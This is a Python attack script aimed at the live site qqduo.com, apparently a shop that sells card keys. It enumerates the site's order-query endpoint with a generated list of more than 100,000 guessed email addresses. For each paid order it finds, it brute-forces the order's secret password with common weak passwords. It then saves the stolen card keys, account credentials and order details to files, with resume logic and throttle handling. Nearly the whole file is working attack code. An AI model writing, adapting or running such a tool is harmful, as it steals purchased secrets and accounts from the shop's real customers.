#!/usr/bin/env python3
"""Deeper email spray + secret dump for qqduo."""
import json, os, re, threading, time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import requests, urllib3
urllib3.disable_warnings()

OUT = Path(os.environ.get("OUT") or "/workspace/qqduo/results/dump")
OUT.mkdir(parents=True, exist_ok=True)
B = "https://qqduo.com"
WORKERS = int(os.environ.get("WORKERS") or "12")
MAX_N = int(os.environ.get("MAX_N") or "99999")

lock = threading.Lock()
tls = threading.local()
stats = {"done": 0, "hits": 0, "orders": 0, "kami": 0, "acc": 0, "errors": 0, "throttle": 0}
seen_tn = set()
kami_rows = []
accounts = set()
hit_orders = []
# resume
for p, bucket in [
    (OUT / "contact_hits_all.json", "hits"),
    (OUT / "contact_hits.json", "hits"),
    (OUT / "contact_kami.json", "kami"),
]:
    if not p.exists():
        continue
    try:
        data = json.loads(p.read_text())
    except Exception:
        continue
    if bucket == "hits":
        for o in data:
            tn = o.get("trade_no")
            if tn and tn not in seen_tn:
                seen_tn.add(tn)
                hit_orders.append(o)
                stats["orders"] = len(seen_tn)
    else:
        for r in data:
            kami_rows.append(r)
            tn = r.get("trade_no")
            if tn:
                seen_tn.add(tn)
            for c in r.get("cards") or []:
                accounts.add(c)
        stats["kami"] = len(kami_rows)
        stats["acc"] = len(accounts)


def log(*a):
    print(*a, flush=True)


def S():
    s = getattr(tls, "s", None)
    if not s:
        s = requests.Session()
        s.verify = False
        s.headers.update({
            "User-Agent": "Mozilla/5.0",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": B,
            "Referer": B + "/user/index/query",
        })
        tls.s = s
    return s


def cards(secret):
    blob = str(secret or "").replace("<br/>", "\n").replace("<br>", "\n")
    return [x.strip() for x in re.split(r"[\r\n]+", blob) if x.strip()]


def save():
    (OUT / "deep_state.json").write_text(json.dumps(stats, ensure_ascii=False), encoding="utf-8")
    (OUT / "contact_kami.json").write_text(json.dumps(kami_rows, ensure_ascii=False, indent=2), encoding="utf-8")
    (OUT / "contact_hits.json").write_text(json.dumps(hit_orders, ensure_ascii=False, indent=2), encoding="utf-8")
    (OUT / "contact_accounts.txt").write_text("\n".join(sorted(accounts)) + ("\n" if accounts else ""), encoding="utf-8")


def extract(j):
    if not isinstance(j, dict) or j.get("code") != 200:
        return []
    data = j.get("data")
    if isinstance(data, list):
        return data
    if isinstance(data, dict):
        return data.get("list") or []
    return []


PWS_BASE = [
    "", "123456", "000000", "123123", "111111", "12345678", "666666", "888888",
    "abcdef", "abc123", "112233", "123321", "654321", "5201314", "password",
    "qwerty", "qq123456", "147258", "159357", "7758521", "1314520",
]


def fetch_secret(tn, kw):
    local = str(kw).split("@")[0]
    pws = [local, "123456", str(kw), local + "123", local + "456"] + PWS_BASE
    seen = set()
    for pw in pws:
        if pw in seen:
            continue
        seen.add(pw)
        try:
            r = S().post(B + "/user/api/index/secret", data={"tradeNo": tn, "password": pw}, timeout=12)
            j = r.json()
        except Exception:
            continue
        if j.get("code") == 200 and j.get("data"):
            d = j["data"]
            return (d.get("secret") if isinstance(d, dict) else d), pw
        msg = str(j.get("msg") or "")
        if "频繁" in msg:
            time.sleep(10)
            continue
        if "还未支付" in msg:
            return None, None
    return None, None


def handle_orders(kw, orders):
    global stats
    with lock:
        stats["hits"] += 1
    for od in orders:
        tn = od.get("trade_no")
        with lock:
            if not tn or tn in seen_tn:
                # still try secret if no kami yet for this tn
                if tn and not any(r.get("trade_no") == tn for r in kami_rows):
                    pass
                else:
                    if tn in seen_tn and any(r.get("trade_no") == tn for r in kami_rows):
                        continue
            if tn and tn not in {x.get("trade_no") for x in hit_orders}:
                od = dict(od)
                od["_query_kw"] = kw
                hit_orders.append(od)
                seen_tn.add(tn)
                stats["orders"] = len(seen_tn)
                save()
            elif tn:
                seen_tn.add(tn)
        if od.get("status") != 1:
            continue
        if any(r.get("trade_no") == tn for r in kami_rows):
            continue
        secret, pw = fetch_secret(tn, od.get("contact") or kw)
        if not secret:
            continue
        cs = cards(secret)
        row = {
            "trade_no": tn,
            "query_kw": kw,
            "password": pw,
            "amount": od.get("amount"),
            "contact": od.get("contact"),
            "pay_time": od.get("pay_time"),
            "commodity_id": od.get("commodity_id"),
            "secret": secret,
            "cards": cs,
            "card_count": len(cs),
        }
        with lock:
            kami_rows.append(row)
            stats["kami"] = len(kami_rows)
            for c in cs:
                accounts.add(c)
            stats["acc"] = len(accounts)
            save()
        log("KAMI", tn, "kw", kw, "pw", pw, "cards", len(cs), "amount", od.get("amount"))


def work(kw):
    kw = str(kw)
    try:
        r = S().post(B + "/user/api/index/query", data={"keywords": kw}, timeout=12)
        j = r.json()
    except Exception:
        with lock:
            stats["errors"] += 1
            stats["done"] += 1
        return
    msg = str(j.get("msg") or "")
    if "频繁" in msg:
        with lock:
            stats["throttle"] += 1
        time.sleep(12)
        return work(kw)
    orders = [x for x in extract(j) if isinstance(x, dict)]
    with lock:
        stats["done"] += 1
        if stats["done"] % 1000 == 0:
            log("progress", stats, "kw", kw)
            save()
    if orders:
        log("HIT", kw, "n", len(orders), "status0", sum(1 for o in orders if o.get("status") == 0),
            "status1", sum(1 for o in orders if o.get("status") == 1))
        handle_orders(kw, orders)


def wordlist():
    locals_ = [
        "123", "1234", "12345", "123456", "123123", "12323", "111111", "000000",
        "666666", "888888", "112233", "5201314", "1314", "10086", "10010",
        "admin", "test", "qq", "qq123", "qq888", "a", "aa", "aaa", "abc", "abcd",
        "abcdef", "qwer", "1", "11", "111", "12", "666", "888", "999",
        "qqduo", "vip818", "w", "ww", "www", "zx", "zxc", "as", "asd", "qwe",
        "aa123456", "abc123", "qqq", "ooo", "xxx", "zzz", "love", "iloveyou",
        "520", "521", "1314520", "7758521", "email", "mail", "user", "guest",
    ]
    # phone-ish
    for p in ["13800138000", "13900139000", "13700137000", "13600136000", "15800000000",
              "18888888888", "18700000000", "18600000000", "13500000000", "13300000000"]:
        locals_.append(p)
    domains = [
        "qq.com", "163.com", "126.com", "gmail.com", "outlook.com", "foxmail.com",
        "yeah.net", "sina.com", "139.com", "88.com", "hotmail.com", "icloud.com",
        "yahoo.com", "vip.qq.com", "sina.cn", "sohu.com", "aliyun.com", "tom.com",
    ]
    words = []
    for loc in locals_:
        for d in domains:
            words.append(f"{loc}@{d}")
    # numeric @qq / @163 / @126
    for i in range(1, MAX_N + 1):
        words.append(f"{i}@qq.com")
        if i <= 20000:
            words.append(f"{i}@163.com")
            words.append(f"{i}@126.com")
    # 5-11 digit qq-like denser for common ranges
    for i in range(10000, 100000):
        words.append(f"{i}@qq.com")
    seen, out = set(), []
    for w in words:
        if w not in seen:
            seen.add(w)
            out.append(w)
    return out


def main():
    words = wordlist()
    log("words", len(words), "workers", WORKERS, "resume_orders", len(seen_tn), "kami", len(kami_rows))
    t0 = time.time()
    with ThreadPoolExecutor(WORKERS) as ex:
        list(ex.map(work, words, chunksize=32))
    save()
    log("DONE", stats, "sec", int(time.time() - t0))


if __name__ == "__main__":
    main()
